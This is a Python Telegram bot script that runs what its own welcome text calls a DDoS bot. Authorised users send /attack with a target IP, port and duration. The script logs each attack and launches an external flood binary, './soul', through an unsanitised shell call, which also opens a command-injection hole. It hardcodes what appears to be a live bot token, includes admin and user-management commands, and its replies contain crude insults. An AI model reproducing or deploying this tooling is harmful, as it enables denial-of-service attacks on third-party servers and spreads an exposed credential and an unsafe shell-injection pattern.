#!/usr/bin/python3

import telebot
import subprocess
import requests
import datetime
import os

# insert your Telegram bot token here
bot = telebot.TeleBot('8160560841:AAFMXzS4yhXU7FcQpJyBcI9WKy_L-wFJGtY')

# Admin user IDs
admin_id = ["", "", "", "1662672529"]

# File to store allowed user IDs
USER_FILE = "users.txt"

# File to store command logs
LOG_FILE = "log.txt"


# Function to read user IDs from the file
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

# Function to read free user IDs and their credits from the file
def read_free_users():
    try:
        with open(FREE_USER_FILE, "r") as file:
            lines = file.read().splitlines()
            for line in lines:
                if line.strip():  # Check if line is not empty
                    user_info = line.split()
                    if len(user_info) == 2:
                        user_id, credits = user_info
                        free_user_credits[user_id] = int(credits)
                    else:
                        print(f"Ignoring invalid line in free user file: {line}")
    except FileNotFoundError:
        pass


# List to store allowed user IDs
allowed_user_ids = read_users()

# Function to log command to the file
def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    if user_info.username:
        username = "@" + user_info.username
    else:
        username = f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:  # Open in "append" mode
        file.write(f"Username: {username}\n𝙩𝙖𝙧𝙜𝙚𝙩: {target}\n𝙥𝙤𝙧𝙩: {port}\n𝙙𝙪𝙧𝙖𝙩𝙤𝙞𝙣: {time}\n\n")


# Function to clear logs
def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                response = "𝙖𝙡𝙧𝙚𝙙𝙮 𝙘𝙡𝙚𝙖𝙧𝙙 𝙣𝙤 𝙙𝙖𝙩𝙖 𝙛𝙤𝙪𝙣𝙙 ❌."
            else:
                file.truncate(0)
                response = "𝙙𝙖𝙩𝙖 𝙘𝙡𝙚𝙖𝙧 𝙨𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮︎"
    except FileNotFoundError:
        response = "𝙣𝙤 𝙙𝙖𝙩𝙖 𝙛𝙤𝙪𝙣𝙙 𝙩𝙤 𝙘𝙡𝙚𝙖𝙧."
    return response

# Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | 𝙩𝙖𝙧𝙜𝙚𝙩: {target}"
    if port:
        log_entry += f" | 𝙥𝙤𝙧𝙩: {port}"
    if time:
        log_entry += f" | 𝙙𝙪𝙧𝙖𝙩𝙤𝙞𝙣: {time}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_add = command[1]
            if user_to_add not in allowed_user_ids:
                allowed_user_ids.append(user_to_add)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_to_add}\n")
                response = f"User {user_to_add} 𝙖𝙙𝙙 𝙨𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮."
            else:
                response = "𝙪𝙨𝙚𝙧 𝙖𝙡𝙧𝙚𝙙𝙮 𝙚𝙭𝙞𝙨𝙩𝙨↩️."
        else:
            response = "𝙥𝙡𝙚𝙖𝙨𝙚 𝙪𝙨𝙚 𝙘𝙪𝙧𝙚𝙘𝙩 𝙛𝙤𝙧𝙢𝙖𝙩 ‼️ ."
    else:
        response = "❌ 𝙤𝙣𝙡𝙮 𝙖𝙣𝙙𝙢𝙞𝙣 𝙘𝙖𝙣 𝙪𝙨𝙚 𝙩𝙝𝙞𝙨 𝙘𝙤𝙢𝙢𝙖𝙣𝙙 ."

    bot.reply_to(message, response)



@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for user_id in allowed_user_ids:
                        file.write(f"{user_id}\n")
                response = f"User {user_to_remove} 𝙧𝙚𝙢𝙤𝙫𝙚𝙙 𝙨𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮 ↪️."
            else:
                response = f"User {user_to_remove} 𝙣𝙤𝙩 𝙛𝙤𝙪𝙣𝙙 ⛔."
        else:
            response = '''𝙥𝙡𝙚𝙖𝙨𝙚 𝙪𝙨𝙚 𝙩𝙝𝙚 𝙘𝙤𝙧𝙧𝙚𝙘𝙩 𝙛𝙤𝙧𝙢𝙖𝙩 . 
𝙚𝙭𝙖𝙢𝙥𝙡𝙚 : /remove 𝙪𝙨𝙚𝙧 𝙞𝙙 '''
    else:
        response = "❌ 𝙤𝙣𝙡𝙮 𝙖𝙙𝙢𝙞𝙣 𝙘𝙖𝙣 𝙪𝙨𝙚 𝙩𝙝𝙞𝙨 𝙘𝙤𝙢𝙢𝙖𝙣𝙙 ."

    bot.reply_to(message, response)


@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(LOG_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "𝙡𝙤𝙜𝙨 𝙖𝙡𝙧𝙚𝙙𝙮 𝙘𝙡𝙚𝙖𝙧𝙙 𝙙𝙖𝙩𝙖 𝙣𝙤𝙩 𝙛𝙤𝙪𝙣𝙙 ⛔."
                else:
                    file.truncate(0)
                    response = "𝙙𝙖𝙩𝙖 𝙘𝙡𝙚𝙖𝙧 𝙨𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮  ✅"
        except FileNotFoundError:
            response = "𝙙𝙖𝙩𝙖 𝙖𝙡𝙧𝙚𝙙𝙮 𝙘𝙡𝙚𝙖𝙧𝙙 ❌."
    else:
        response = "❌ 𝙤𝙣𝙡𝙮 𝙖𝙙𝙢𝙞𝙣 𝙘𝙖𝙣 𝙪𝙨𝙚 𝙩𝙝𝙞𝙨 𝙘𝙤𝙢𝙢𝙖𝙣𝙙 ."
    bot.reply_to(message, response)

 

@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                if user_ids:
                    response = "Authorized Users:\n"
                    for user_id in user_ids:
                        try:
                            user_info = bot.get_chat(int(user_id))
                            username = user_info.username
                            response += f"- @{username} (ID: {user_id})\n"
                        except Exception as e:
                            response += f"- User ID: {user_id}\n"
                else:
                    response = "𝙣𝙤𝙩 𝙛𝙤𝙪𝙣𝙙 ⛔"
        except FileNotFoundError:
            response = "𝙣𝙤𝙩 𝙛𝙤𝙪𝙣𝙙 ⛔ "
    else:
        response = "❌ 𝙤𝙣𝙡𝙮 𝙖𝙙𝙢𝙞𝙣 𝙘𝙖𝙣 𝙪𝙨𝙚 𝙩𝙝𝙞𝙨 𝙘𝙤𝙢𝙢𝙖𝙣𝙙 ."
    bot.reply_to(message, response)


@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
            except FileNotFoundError:
                response = "𝙣𝙤𝙩 𝙛𝙤𝙪𝙣𝙙  ‼️."
                bot.reply_to(message, response)
        else:
            response = "𝙣𝙤𝙩 𝙛𝙤𝙪𝙣𝙙  ‼️"
            bot.reply_to(message, response)
    else:
        response = "❌ 𝙤𝙣𝙡𝙮 𝙖𝙙𝙢𝙞𝙣 𝙘𝙖𝙣 𝙪𝙨𝙚 𝙩𝙝𝙞𝙨 𝙘𝙤𝙢𝙢𝙖𝙣𝙙 ."
        bot.reply_to(message, response)


@bot.message_handler(commands=['id'])
def show_user_id(message):
    user_id = str(message.chat.id)
    response = f"🤖Your ID: {user_id}"
    bot.reply_to(message, response)

# Function to handle the reply when free users run the /bgmi command
def start_attack_reply(message, target, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
    
    response = f"{username}, 𝘼𝙩𝙩𝙖𝙘𝙠 𝙡𝙖𝙪𝙣𝙘𝙝𝙚𝙙 \n\n𝙩𝙖𝙧𝙜𝙚𝙩: {target}\n𝙥𝙤𝙧𝙩: {port}\n𝙙𝙪𝙧𝙖𝙩𝙤𝙞𝙣: {time} 𝙨𝙚𝙘𝙤𝙣𝙙𝙨\n𝙟𝙤𝙞𝙣 𝙣𝙤𝙬 : https://t.me/+03wLVBPurPk2NWRl"
    bot.reply_to(message, response)

# Dictionary to store the last time each user ran the /bgmi command
bgmi_cooldown = {}

COOLDOWN_TIME =0

# Handler for /bgmi command
@bot.message_handler(commands=['attack'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        # Check if the user is in admin_id (admins have no cooldown)
        if user_id not in admin_id:
            # Check if the user has run the command before and is still within the cooldown period
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 0:
                response = "𝙥𝙡𝙚𝙖𝙨𝙚 𝙬𝙖𝙞𝙩 𝙘𝙤𝙤𝙡𝙙𝙤𝙬𝙣 𝙣𝙤𝙬 𝙩𝙝𝙖𝙣 𝙪𝙨𝙚 𝙖𝙜𝙖𝙞𝙣 /attack 𝙘𝙤𝙢𝙢𝙖𝙣𝙙."
                bot.reply_to(message, response)
                return
            # Update the last time the user ran the command
            bgmi_cooldown[user_id] = datetime.datetime.now()
        
        command = message.text.split()
        if len(command) == 4:  # Updated to accept target, time, and port
            target = command[1]
            port = int(command[2])  # Convert time to integer
            time = int(command[3])  # Convert port to integer
            if time > 150:
                response = "𝙚𝙧𝙧𝙤𝙧: 𝙤𝙣𝙡𝙮 𝙪𝙨𝙚 𝙤𝙣 149 𝙨𝙚𝙘𝙤𝙣𝙙𝙨"
            else:
                record_command_logs(user_id, '/attack', target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                full_command = f"./soul {target} {port} {time} 600"
                subprocess.run(full_command, shell=True)
                response = f"𝘼𝙩𝙩𝙖𝙘𝙠 𝙛𝙞𝙣𝙞𝙨𝙝𝙚𝙙. 𝙩𝙖𝙧𝙜𝙚𝙩: {target} 𝙥𝙤𝙧𝙩: {port} 𝙙𝙪𝙧𝙖𝙩𝙤𝙞𝙣: {time}"
        else:
            response = "𝙚𝙭𝙖𝙢𝙥𝙡𝙚 :- /attack  ☾︎𝙞𝙥☽︎ ☾︎𝙥𝙤𝙧𝙩☽ ︎☾︎𝙙𝙪𝙧𝙖𝙩𝙤𝙞𝙣☽︎"  # Updated command syntax
    else:
        response = "❌ 𝙮𝙤𝙪 𝙖𝙧𝙚 𝙣𝙤𝙩 𝙖𝙪𝙩𝙝𝙤𝙧𝙞𝙯𝙚𝙙 𝙩𝙤 𝙪𝙨𝙚 𝙩𝙝𝙞𝙨 𝙘𝙤𝙢𝙢𝙖𝙣𝙙."

    bot.reply_to(message, response)



# Add /mylogs command to display logs recorded for bgmi and website commands
@bot.message_handler(commands=['mylogs'])
def show_command_logs(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        try:
            with open(LOG_FILE, "r") as file:
                command_logs = file.readlines()
                user_logs = [log for log in command_logs if f"UserID: {user_id}" in log]
                if user_logs:
                    response = "Your Command Logs:\n" + "".join(user_logs)
                else:
                    response = "𝙣𝙤 𝙡𝙤𝙜𝙨 𝙘𝙤𝙢𝙢𝙖𝙣𝙙 𝙛𝙤𝙪𝙣𝙙."
        except FileNotFoundError:
            response = "𝙣𝙤 𝙘𝙤𝙢𝙢𝙖𝙣𝙙 𝙙𝙖𝙩𝙖 𝙛𝙤𝙪𝙣𝙙."
    else:
        response = " ❌ 𝙮𝙤𝙪 𝙖𝙧𝙚 𝙣𝙤𝙩 𝙖𝙪𝙩𝙝𝙤𝙧𝙞𝙯𝙚𝙙 𝙩𝙤 𝙪𝙨𝙚 𝙩𝙝𝙞𝙨 𝙘𝙤𝙢𝙢𝙖𝙣𝙙."

    bot.reply_to(message, response)


@bot.message_handler(commands=['help'])
def show_help(message):
    help_text ='''𝙘𝙤𝙢𝙢𝙖𝙣𝙙𝙨:
🔰 /attack : 𝙪𝙨𝙚 𝙛𝙤𝙧 𝙖𝙩𝙩𝙖𝙘𝙠. 
🔰 /rules : 𝙘𝙝𝙚𝙘𝙠 𝙖𝙩𝙩𝙖𝙘𝙠 𝙧𝙪𝙡𝙨.
🔰 /mylogs : 𝙘𝙝𝙚𝙘𝙠 𝙮𝙤𝙪𝙧 𝙥𝙖𝙨𝙩 𝙖𝙩𝙩𝙖𝙘𝙠𝙨.
🔰 /plan : 𝙥𝙡𝙖𝙣 𝙟𝙖𝙧𝙪𝙧 𝙘𝙝𝙚𝙘𝙠 𝙠𝙖𝙧𝙤.

'''
    for handler in bot.message_handlers:
        if hasattr(handler, 'commands'):
            if message.text.startswith('/help'):
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
            elif handler.doc and 'admin' in handler.doc.lower():
                continue
            else:
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
    bot.reply_to(message, help_text)

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f'''𝙬𝙚𝙡𝙘𝙤𝙢𝙚 𝙩𝙤 𝙜𝙤𝙙𝙭𝙘𝙝𝙚𝙖𝙩𝙨 𝙙𝙙𝙤𝙨, {user_name}! 𝙩𝙧𝙮 𝙩𝙤 𝙩𝙝𝙞𝙨 𝙘𝙤𝙢𝙢𝙖𝙣𝙙 : /help 
𝙬𝙚𝙡𝙘𝙤𝙢𝙚 𝙩𝙤 𝙖𝙡𝙤𝙣𝙚𝙗𝙤𝙮 𝙙𝙙𝙤𝙨 𝙗𝙤𝙩 '''
    bot.reply_to(message, response)

@bot.message_handler(commands=['rules'])
def welcome_rules(message):
    user_name = message.from_user.first_name
    response = f'''{user_name} 𝙩𝙪 𝙟𝙖 𝙗𝙚 𝙡𝙖𝙪𝙙𝙚⚠️:

1.  ⠀⠀⠀⠀██████ ]▄▄▄▄▄▄▄
▂▅████████▅▃▂   ☻
Il████████████]. / ▌\╦─  
@@@@@@@@@@@@@@    /  \


'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['plan'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, 𝙥𝙡𝙖𝙣𝙚 𝙙𝙚𝙠𝙝𝙚𝙜𝙖 𝙡𝙖𝙪𝙙𝙚 :

 ⠛⠛⣿⣿⣿⣿⣿⡷⢶⣦⣶⣶⣤⣤⣤⣀⠀⠀⠀
 ⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀
 ⠀⠀⠀⠉⠉⠉⠙⠻⣿⣿⠿⠿⠛⠛⠛⠻⣿⣿⣇⠀
 ⠀⠀⢤⣀⣀⣀⠀⠀⢸⣷⡄⠀⣁⣀⣤⣴⣿⣿⣿⣆
 ⠀⠀⠀⠀⠹⠏⠀⠀⠀⣿⣧⠀⠹⣿⣿⣿⣿⣿⡿⣿
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠿⠇⢀⣼⣿⣿⠛⢯⡿⡟
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠦⠴⢿⢿⣿⡿⠷⠀⣿⠀
 ⠀⠀⠀⠀⠀⠀⠀⠙⣷⣶⣶⣤⣤⣤⣤⣤⣶⣦⠃⠀
 ⠀⠀⠀⠀⠀⠀⠀⢐⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⢿⣿⣿⣿⣿⠟⠁

'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['admincmd'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, 𝙖𝙙𝙢𝙞𝙣 𝙘𝙤𝙢𝙢𝙖𝙣𝙙𝙨!!:

↪️ /add  : 𝙖𝙙𝙙 𝙖 𝙪𝙨𝙚𝙧.
↪️ /remove 𝙧𝙚𝙢𝙤𝙫𝙚 𝙪𝙨𝙚𝙧.
↪️ /allusers : 𝙖𝙪𝙩𝙝𝙤𝙧𝙞𝙯𝙚𝙙 𝙪𝙨𝙚𝙧𝙨.
↪️ /logs : 𝙖𝙡𝙡 𝙪𝙨𝙚𝙧 𝙙𝙖𝙩𝙖.
↪️ /broadcast : 𝙢𝙚𝙨𝙨𝙖𝙜𝙚.
↪️ /clearlogs : 𝙘𝙡𝙚𝙖𝙧 𝙙𝙖𝙩𝙖.
↪️ /info: 𝙥𝙪𝙗𝙡𝙞𝙘 𝙙𝙚𝙩𝙖𝙞𝙡𝙨.
'''
    bot.reply_to(message, response)


@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split(maxsplit=1)
        if len(command) > 1:
            message_to_broadcast = "⚠️ 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙩𝙤 𝙖𝙡𝙡 𝙪𝙨𝙚𝙧 𝙛𝙤𝙧 𝙤𝙬𝙣𝙣𝙚𝙧:\n\n" + command[1]
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                for user_id in user_ids:
                    try:
                        bot.send_message(user_id, message_to_broadcast)
                    except Exception as e:
                        print(f"𝙛𝙖𝙞𝙡𝙙 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙢𝙚𝙨𝙨𝙖𝙜𝙚  {user_id}: {str(e)}")
            response = "𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙨𝙚𝙣𝙙 𝙨𝙪𝙘𝙘𝙚𝙨𝙖𝙛𝙪𝙡𝙡𝙮 ✅."
        else:
            response = "𝙩𝙮𝙥𝙚 𝙖 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 ."
    else:
        response = "❌ 𝙤𝙣𝙡𝙮 𝙖𝙙𝙢𝙞𝙣 𝙘𝙖𝙣 𝙪𝙨𝙚 𝙩𝙝𝙞𝙨 𝙘𝙤𝙢𝙢𝙖𝙣𝙙."

    bot.reply_to(message, response)




bot.polling()
